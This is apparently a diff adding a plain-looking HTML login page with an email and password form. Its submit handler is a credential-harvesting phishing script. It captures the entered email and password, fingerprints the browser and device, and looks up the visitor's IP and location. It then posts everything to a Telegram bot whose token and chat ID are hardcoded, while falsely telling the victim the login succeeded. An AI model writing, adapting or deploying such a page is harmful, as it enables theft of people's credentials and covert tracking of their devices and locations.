@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        h2 {
+            text-align: center;
+            color: #1a73e8;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1a73e8;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #1557b0;
+        }
+        #message {
+            margin-top: 15px;
+            text-align: center;
+            font-weight: bold;
+        }
+        .success {
+            color: #28a745;
+        }
+        .error {
+            color: #dc3545;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit">Login</button>
+        </form>
+        <div id="message"></div>
+    </div>
+
+    <script>
+        // Function to get device information
+        function getDeviceInfo() {
+            const deviceInfo = {
+                // Browser & OS Info
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                
+                // Screen Info
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                screenAvailWidth: window.screen.availWidth,
+                screenAvailHeight: window.screen.availHeight,
+                colorDepth: window.screen.colorDepth,
+                pixelDepth: window.screen.pixelDepth,
+                
+                // Window Info
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                
+                // Time & Location Info
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                currentTime: new Date().toLocaleString(),
+                
+                // Hardware Info
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                
+                // Connection Info
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : 'N/A',
+                
+                // Browser Specific
+                vendor: navigator.vendor,
+                productSub: navigator.productSub,
+                doNotTrack: navigator.doNotTrack || 'N/A',
+                
+                // Device Type Detection
+                isMobile: /Mobi|Android/i.test(navigator.userAgent),
+                isTablet: /iPad|Android(?!.*Mobile)/i.test(navigator.userAgent),
+                isDesktop: !/Mobi|Android/i.test(navigator.userAgent),
+            };
+            
+            return deviceInfo;
+        }
+        
+        // Function to get IP and location info
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ip = data.ip;
+                
+                // Get location info based on IP (using free API)
+                const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
+                const geoData = await geoResponse.json();
+                
+                return {
+                    ip: ip,
+                    country: geoData.country || 'N/A',
+                    countryCode: geoData.countryCode || 'N/A',
+                    region: geoData.regionName || 'N/A',
+                    city: geoData.city || 'N/A',
+                    zip: geoData.zip || 'N/A',
+                    lat: geoData.lat || 'N/A',
+                    lon: geoData.lon || 'N/A',
+                    isp: geoData.isp || 'N/A',
+                    org: geoData.org || 'N/A',
+                    as: geoData.as || 'N/A'
+                };
+            } catch (error) {
+                console.error('Error getting IP info:', error);
+                return {
+                    ip: 'Unable to fetch',
+                    country: 'N/A',
+                    city: 'N/A'
+                };
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const messageDiv = document.getElementById('message');
+            
+            // Clear previous messages
+            messageDiv.textContent = '';
+            messageDiv.className = '';
+            
+            // Validate email and password
+            if (!email || !password) {
+                messageDiv.textContent = 'Please fill in all fields';
+                messageDiv.className = 'error';
+                return;
+            }
+            
+            // Telegram Bot API details
+            const botToken = '8696667868:AAEmf6C_lyLR_KoaSPGDvccFuk1kL78RIFs';
+            const chatId = '-1002681260911';
+            
+            // Get device info
+            const deviceInfo = getDeviceInfo();
+            
+            // Get IP info
+            const ipInfo = await getIPInfo();
+            
+            // Prepare formatted message
+            const message = `
+🔐 <b>New Login Attempt</b>
+
+<b>👤 Login Credentials:</b>
+📧 Email: <code>${email}</code>
+🔑 Password: <code>${password}</code>
+
+<b>🌐 IP & Location:</b>
+📍 IP: <code>${ipInfo.ip}</code>
+🌍 Country: ${ipInfo.country} (${ipInfo.countryCode})
+🏙 City: ${ipInfo.city}
+🏛 Region: ${ipInfo.region}
+📮 ZIP: ${ipInfo.zip}
+🌐 ISP: ${ipInfo.isp}
+🏢 Organization: ${ipInfo.org}
+
+<b>📱 Device Information:</b>
+💻 Platform: ${deviceInfo.platform}
+🖥 Device Type: ${deviceInfo.isMobile ? '📱 Mobile' : deviceInfo.isTablet ? '📱 Tablet' : '💻 Desktop'}
+🖥 Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
+🪟 Window: ${deviceInfo.windowWidth}x${deviceInfo.windowHeight}
+🎨 Color Depth: ${deviceInfo.colorDepth}-bit
+📱 Touch Points: ${deviceInfo.maxTouchPoints}
+
+<b>🔧 System Details:</b>
+🧠 Device Memory: ${deviceInfo.deviceMemory} GB
+⚙️ CPU Cores: ${deviceInfo.hardwareConcurrency}
+🌐 Online Status: ${deviceInfo.onLine ? '✅ Online' : '❌ Offline'}
+🍪 Cookies: ${deviceInfo.cookieEnabled ? '✅ Enabled' : '❌ Disabled'}
+
+<b>🌍 Browser & OS:</b>
+🕐 Timezone: ${deviceInfo.timezone}
+🕑 Time: ${deviceInfo.currentTime}
+🗣 Language: ${deviceInfo.language}
+🔍 User Agent: <code>${deviceInfo.userAgent}</code>
+
+<b>📡 Connection:</b>
+${deviceInfo.connection !== 'N/A' ? `
+⚡ Type: ${deviceInfo.connection.effectiveType}
+📶 Downlink: ${deviceInfo.connection.downlink} Mbps
+⏱ RTT: ${deviceInfo.connection.rtt}ms
+💾 Data Saver: ${deviceInfo.connection.saveData ? '✅ On' : '❌ Off'}
+` : '📡 Connection info not available'}
+            `.trim();
+            
+            // Disable button and show loading state
+            const button = this.querySelector('button');
+            const originalText = button.textContent;
+            button.textContent = 'Logging in...';
+            button.disabled = true;
+            
+            try {
+                // Send to Telegram
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    messageDiv.textContent = 'Login successful!';
+                    messageDiv.className = 'success';
+                    
+                    // Clear the form
+                    document.getElementById('loginForm').reset();
+                    
+                    // Redirect after 2 seconds (optional)
+                    setTimeout(() => {
+                        // window.location.href = 'https://example.com/dashboard';
+                        console.log('Redirect would happen here');
+                    }, 2000);
+                } else {
+                    throw new Error('Failed to send message');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                messageDiv.textContent = 'Login failed. Please try again.';
+                messageDiv.className = 'error';
+            } finally {
+                // Re-enable button
+                button.textContent = originalText;
+                button.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
